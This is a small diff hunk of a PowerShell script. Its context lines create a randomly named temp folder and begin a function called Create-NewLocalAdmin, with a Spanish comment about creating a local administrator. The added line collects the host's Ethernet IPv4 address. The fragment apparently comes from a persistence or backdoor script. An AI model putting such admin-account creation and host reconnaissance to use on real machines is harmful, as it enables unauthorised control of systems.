@@ -10,6 +10,7 @@ function random_text {
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
+$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
 
 #Creando administrador local
 function Create-NewLocalAdmin {
